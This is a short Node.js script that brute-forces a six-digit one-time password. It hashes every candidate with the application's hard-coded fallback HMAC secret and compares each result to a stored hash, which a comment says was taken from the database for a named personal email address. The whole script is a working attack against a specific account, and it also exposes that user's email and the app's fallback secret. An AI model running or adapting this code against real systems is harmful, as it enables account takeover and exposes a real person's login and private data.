const crypto = require('crypto');
const secret = process.env.SESSION_SECRET || 'smartinterview-otp-salt-fallback-32chars';

function bruteForce(targetHash) {
  for (let i = 100000; i < 1000000; i++) {
    const otp = i.toString();
    const hash = crypto.createHmac('sha256', secret).update(otp).digest('hex');
    if (hash === targetHash) return otp;
  }
  return null;
}

const target = '75e7398492a39553bf60425cb460e1840033d7e6d6bb5b46e15f3681a75944bc'; // from DB for battularathanraj6@gmail.com
console.log('Found OTP:', bruteForce(target));
